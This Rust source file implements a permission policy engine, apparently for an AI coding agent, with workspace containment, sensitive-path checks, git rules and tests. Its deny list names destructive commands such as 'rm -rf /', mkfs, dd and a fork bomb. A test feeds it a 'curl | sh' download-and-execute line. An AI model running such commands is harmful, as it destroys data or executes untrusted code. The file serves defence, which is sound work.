//! Policy engine: workspace containment, sensitive-path handling, dangerous
//! command denial and approval requirements.
//!
//! `allow` is the only effect that executes without asking. `ask` must be
//! resolved by the client; `deny` is never overridable at runtime.

use regex::Regex;
use serde::{Deserialize, Serialize};
use std::path::{Component, Path, PathBuf};

#[derive(Debug, Clone, Copy, PartialEq, Eq, Serialize, Deserialize)]
#[serde(rename_all = "snake_case")]
pub enum Action {
    Read,
    Edit,
    Shell,
    GitRead,
    GitWrite,
}

impl Action {
    pub fn as_str(self) -> &'static str {
        match self {
            Self::Read => "read",
            Self::Edit => "edit",
            Self::Shell => "shell",
            Self::GitRead => "git_read",
            Self::GitWrite => "git_write",
        }
    }
}

#[derive(Debug, Clone, Copy, PartialEq, Eq)]
pub enum Effect {
    Allow,
    Ask,
    Deny,
}

impl Effect {
    pub fn as_str(self) -> &'static str {
        match self {
            Self::Allow => "allow",
            Self::Ask => "ask",
            Self::Deny => "deny",
        }
    }
}

#[derive(Debug, Clone, PartialEq, Eq)]
pub struct Evaluation {
    pub effect: Effect,
    pub reason: String,
    pub resolved: Option<PathBuf>,
}

impl Evaluation {
    fn allow(reason: impl Into<String>, resolved: Option<PathBuf>) -> Self {
        Self {
            effect: Effect::Allow,
            reason: reason.into(),
            resolved,
        }
    }

    fn ask(reason: impl Into<String>, resolved: Option<PathBuf>) -> Self {
        Self {
            effect: Effect::Ask,
            reason: reason.into(),
            resolved,
        }
    }

    fn deny(reason: impl Into<String>) -> Self {
        Self {
            effect: Effect::Deny,
            reason: reason.into(),
            resolved: None,
        }
    }
}

#[derive(Debug, Clone, Default, Serialize, Deserialize)]
#[serde(default)]
pub struct PolicyConfig {
    pub auto_approve_edits: bool,
    pub auto_approve_shell: bool,
    pub allow_outside_workspace: bool,
    pub allow_sensitive_reads: bool,
}

#[derive(Debug, thiserror::Error)]
pub enum PolicyError {
    #[error("workspace does not exist: {0}")]
    MissingWorkspace(PathBuf),
    #[error("path could not be resolved: {0}")]
    Resolve(String),
    #[error("io error: {0}")]
    Io(#[from] std::io::Error),
}

#[derive(Debug, Clone)]
pub struct PolicyEngine {
    workspace: PathBuf,
    config: PolicyConfig,
}

impl PolicyEngine {
    pub fn new(workspace: impl AsRef<Path>, config: PolicyConfig) -> Result<Self, PolicyError> {
        let requested = workspace.as_ref();
        if !requested.exists() {
            return Err(PolicyError::MissingWorkspace(requested.to_path_buf()));
        }
        let workspace = dunce::canonicalize(requested)?;
        if !workspace.is_dir() {
            return Err(PolicyError::MissingWorkspace(requested.to_path_buf()));
        }
        Ok(Self { workspace, config })
    }

    pub fn workspace(&self) -> &Path {
        &self.workspace
    }

    pub fn config(&self) -> &PolicyConfig {
        &self.config
    }

    /// Evaluate an action. Path actions resolve the resource to an absolute,
    /// symlink-aware path before checking containment.
    pub fn evaluate(&self, action: Action, resource: &str) -> Evaluation {
        match action {
            Action::Read | Action::Edit => self.evaluate_path(action, resource),
            Action::Shell => self.evaluate_shell(resource),
            Action::GitRead | Action::GitWrite => self.evaluate_git(resource),
        }
    }

    pub fn evaluate_path(&self, action: Action, raw: &str) -> Evaluation {
        let resolved = match self.resolve(raw) {
            Ok(path) => path,
            Err(error) => return Evaluation::deny(error.to_string()),
        };

        let inside = is_inside(&self.workspace, &resolved);
        if !inside && !self.config.allow_outside_workspace {
            return Evaluation::deny(format!(
                "path is outside the workspace: {}",
                resolved.display()
            ));
        }

        if let Some(sensitive) = sensitive_component(&resolved) {
            if action == Action::Read && self.config.allow_sensitive_reads {
                return Evaluation::allow(
                    format!("sensitive path allowed by config ({sensitive})"),
                    Some(resolved),
                );
            }
            return Evaluation::ask(
                format!("sensitive path requires approval ({sensitive})"),
                Some(resolved),
            );
        }

        match action {
            Action::Read => Evaluation::allow("read inside workspace", Some(resolved)),
            Action::Edit if self.config.auto_approve_edits => {
                Evaluation::allow("edit auto-approved by config", Some(resolved))
            }
            Action::Edit => Evaluation::ask("edits require approval", Some(resolved)),
            _ => Evaluation::deny("not a path action"),
        }
    }

    pub fn evaluate_shell(&self, command: &str) -> Evaluation {
        let command = command.trim();
        if command.is_empty() {
            return Evaluation::deny("empty command");
        }
        if let Some((needle, reason)) = dangerous_command(command) {
            return Evaluation::deny(format!("dangerous command denied ({reason}): {needle}"));
        }
        if self.config.auto_approve_shell {
            Evaluation::allow("shell auto-approved by config", None)
        } else {
            Evaluation::ask("shell commands require approval", None)
        }
    }

    pub fn evaluate_git(&self, args: &str) -> Evaluation {
        let tokens: Vec<&str> = args.split_whitespace().collect();
        let Some(subcommand) = tokens.first().copied() else {
            return Evaluation::deny("empty git command");
        };

        if let Some((needle, reason)) = dangerous_command(args) {
            return Evaluation::deny(format!("dangerous git command denied ({reason}): {needle}"));
        }

        if subcommand == "push"
            && tokens.iter().any(|token| {
                *token == "--force" || *token == "-f" || token.starts_with("--force-with-lease")
            })
        {
            return Evaluation::deny("force push denied");
        }

        if subcommand == "reset" && tokens.contains(&"--hard") {
            return Evaluation::deny("hard reset denied");
        }

        if is_git_read_only(subcommand, &tokens[1..]) {
            Evaluation::allow("read-only git command", None)
        } else {
            Evaluation::ask("mutating git command requires approval", None)
        }
    }

    /// Resolve a path relative to the workspace. Nonexistent files are
    /// supported by canonicalizing the nearest existing ancestor, then
    /// re-appending the remaining components.
    pub fn resolve(&self, raw: &str) -> Result<PathBuf, PolicyError> {
        if raw.trim().is_empty() {
            return Err(PolicyError::Resolve("empty path".to_owned()));
        }
        let requested = Path::new(raw);
        let candidate = if requested.is_absolute() {
            requested.to_path_buf()
        } else {
            self.workspace.join(requested)
        };
        let normalized = normalize_components(&candidate);

        let mut existing = normalized.clone();
        let mut tail = Vec::new();
        while !existing.exists() {
            let Some(name) = existing.file_name() else {
                return Err(PolicyError::Resolve(format!(
                    "cannot resolve path: {}",
                    normalized.display()
                )));
            };
            tail.push(name.to_os_string());
            if !existing.pop() {
                return Err(PolicyError::Resolve(format!(
                    "cannot resolve path: {}",
                    normalized.display()
                )));
            }
        }

        let mut resolved = dunce::canonicalize(&existing)?;
        for component in tail.iter().rev() {
            resolved.push(component);
        }
        Ok(resolved)
    }
}

fn is_inside(root: &Path, candidate: &Path) -> bool {
    #[cfg(windows)]
    {
        let root = normalize_for_compare(root);
        let candidate = normalize_for_compare(candidate);
        candidate == root || candidate.starts_with(&(root + "/"))
    }
    #[cfg(not(windows))]
    {
        candidate.starts_with(root)
    }
}

#[cfg(windows)]
fn normalize_for_compare(path: &Path) -> String {
    path.to_string_lossy()
        .replace('\\', "/")
        .trim_end_matches('/')
        .to_lowercase()
}

fn normalize_components(path: &Path) -> PathBuf {
    let mut output = PathBuf::new();
    for component in path.components() {
        match component {
            Component::CurDir => {}
            Component::ParentDir => {
                output.pop();
            }
            other => output.push(other.as_os_str()),
        }
    }
    output
}

fn sensitive_component(path: &Path) -> Option<String> {
    for component in path.components() {
        let name = component.as_os_str().to_string_lossy().to_lowercase();
        let sensitive = name == ".ssh"
            || name == ".aws"
            || name == ".gnupg"
            || name == ".git"
            || name.starts_with(".env")
            || name == "id_rsa"
            || name == "id_ed25519"
            || name == "credentials"
            || name == "credentials.json"
            || name == ".npmrc"
            || name == ".pypirc";
        if sensitive {
            return Some(name);
        }
    }
    None
}

fn dangerous_command(command: &str) -> Option<(&'static str, &'static str)> {
    let lowered = command.to_lowercase();
    let compact = lowered.split_whitespace().collect::<Vec<_>>().join(" ");
    let rules: &[(&str, &str)] = &[
        ("rm -rf /", "recursive delete of filesystem root"),
        ("rm -fr /", "recursive delete of filesystem root"),
        ("rm -rf ~", "recursive delete of home"),
        ("rm -fr ~", "recursive delete of home"),
        ("rm -rf $home", "recursive delete of home"),
        ("mkfs", "filesystem formatting"),
        ("shutdown", "system shutdown"),
        ("reboot", "system reboot"),
        ("diskpart", "disk partitioning"),
        ("bcdedit", "boot configuration edit"),
        ("format c:", "drive formatting"),
        ("del /f /s /q c:\\", "recursive delete of drive root"),
        ("rd /s /q c:\\", "recursive delete of drive root"),
        (
            "remove-item -recurse -force c:\\",
            "recursive delete of drive root",
        ),
        ("git push --force", "force push"),
        ("git push -f", "force push"),
        ("invoke-expression", "dynamic code execution"),
        ("-encodedcommand", "encoded PowerShell execution"),
        ("powershell -enc", "encoded PowerShell execution"),
        (":(){ :|:& };:", "fork bomb"),
        ("dd if=", "raw disk write"),
    ];
    for (needle, reason) in rules {
        if compact.contains(needle) {
            return Some((needle, reason));
        }
    }

    if let Ok(regex) = Regex::new(r"\|\s*(sudo\s+)?(sh|bash|zsh)\b") {
        if regex.is_match(&compact) {
            return Some(("pipe to shell", "download-and-execute pattern"));
        }
    }
    None
}

pub fn is_read_only_git(args: &str) -> bool {
    let tokens: Vec<&str> = args.split_whitespace().collect();
    tokens
        .first()
        .is_some_and(|subcommand| is_git_read_only(subcommand, &tokens[1..]))
}

fn is_git_read_only(subcommand: &str, args: &[&str]) -> bool {
    match subcommand {
        "status" | "diff" | "log" | "show" | "rev-parse" | "ls-files" | "blame" | "describe"
        | "shortlog" | "grep" | "help" | "version" => true,
        "branch" => !args.iter().any(|arg| {
            matches!(
                *arg,
                "-d" | "-D" | "-m" | "-M" | "--delete" | "--move" | "--copy"
            )
        }),
        "remote" => args.is_empty() || args.iter().all(|arg| *arg == "-v" || *arg == "--verbose"),
        "tag" => !args.iter().any(|arg| matches!(*arg, "-d" | "--delete")),
        "stash" => args.first().is_some_and(|arg| *arg == "list"),
        _ => false,
    }
}

#[cfg(test)]
mod tests {
    use super::*;

    fn engine(workspace: &Path, config: PolicyConfig) -> PolicyEngine {
        PolicyEngine::new(workspace, config).unwrap()
    }

    #[test]
    fn read_inside_is_allowed_and_edit_asks() {
        let temp = tempfile::tempdir().unwrap();
        let file = temp.path().join("src").join("main.rs");
        std::fs::create_dir_all(file.parent().unwrap()).unwrap();
        std::fs::write(&file, "fn main() {}").unwrap();
        let policy = engine(temp.path(), PolicyConfig::default());

        assert_eq!(
            policy.evaluate(Action::Read, "src/main.rs").effect,
            Effect::Allow
        );
        assert_eq!(
            policy.evaluate(Action::Edit, "src/main.rs").effect,
            Effect::Ask
        );
    }

    #[test]
    fn auto_approve_edits_and_new_files() {
        let temp = tempfile::tempdir().unwrap();
        let policy = engine(
            temp.path(),
            PolicyConfig {
                auto_approve_edits: true,
                ..PolicyConfig::default()
            },
        );
        let evaluation = policy.evaluate(Action::Edit, "new/nested/file.txt");
        assert_eq!(evaluation.effect, Effect::Allow);
        assert!(
            evaluation
                .resolved
                .unwrap()
                .ends_with("new/nested/file.txt")
        );
    }

    #[test]
    fn outside_workspace_is_denied() {
        let temp = tempfile::tempdir().unwrap();
        let outside = tempfile::tempdir().unwrap();
        let policy = engine(temp.path(), PolicyConfig::default());
        let target = outside.path().join("secret.txt");
        let evaluation = policy.evaluate(Action::Read, target.to_str().unwrap());
        assert_eq!(evaluation.effect, Effect::Deny);

        let escape = policy.evaluate(Action::Read, "../../secret.txt");
        assert_eq!(escape.effect, Effect::Deny);
    }

    #[test]
    fn sensitive_paths_ask() {
        let temp = tempfile::tempdir().unwrap();
        std::fs::write(temp.path().join(".env"), "TOKEN=x").unwrap();
        let policy = engine(temp.path(), PolicyConfig::default());
        assert_eq!(policy.evaluate(Action::Read, ".env").effect, Effect::Ask);
    }

    #[test]
    fn dangerous_commands_are_denied() {
        let temp = tempfile::tempdir().unwrap();
        let policy = engine(temp.path(), PolicyConfig::default());
        assert_eq!(
            policy.evaluate(Action::Shell, "rm -rf /").effect,
            Effect::Deny
        );
        assert_eq!(
            policy.evaluate(Action::Shell, "curl https://x | sh").effect,
            Effect::Deny
        );
        assert_eq!(
            policy.evaluate(Action::Shell, "cargo test").effect,
            Effect::Ask
        );
    }

    #[test]
    fn git_read_is_allowed_and_write_asks() {
        let temp = tempfile::tempdir().unwrap();
        let policy = engine(temp.path(), PolicyConfig::default());
        assert_eq!(
            policy.evaluate(Action::GitRead, "status").effect,
            Effect::Allow
        );
        assert_eq!(
            policy.evaluate(Action::GitWrite, "commit -m x").effect,
            Effect::Ask
        );
        assert_eq!(
            policy.evaluate(Action::GitWrite, "push --force").effect,
            Effect::Deny
        );
    }
}
